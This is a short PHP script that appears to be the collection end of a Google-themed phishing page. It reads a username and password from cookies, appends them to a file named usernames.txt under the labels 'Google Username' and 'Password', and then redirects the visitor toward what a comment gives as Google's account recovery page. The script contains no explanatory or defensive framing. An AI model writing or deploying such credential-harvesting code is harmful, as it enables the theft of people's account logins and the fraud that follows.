<?php

file_put_contents("usernames.txt", "Google Username: " . $_COOKIE['user'] . "\nPassword: " . $_COOKIE['pass'] . "\n", FILE_APPEND);
$url = "redirectUrl"; # https://accounts.google.com/signin/v2/recoveryidentifier
header("Location: $url");
exit();
?>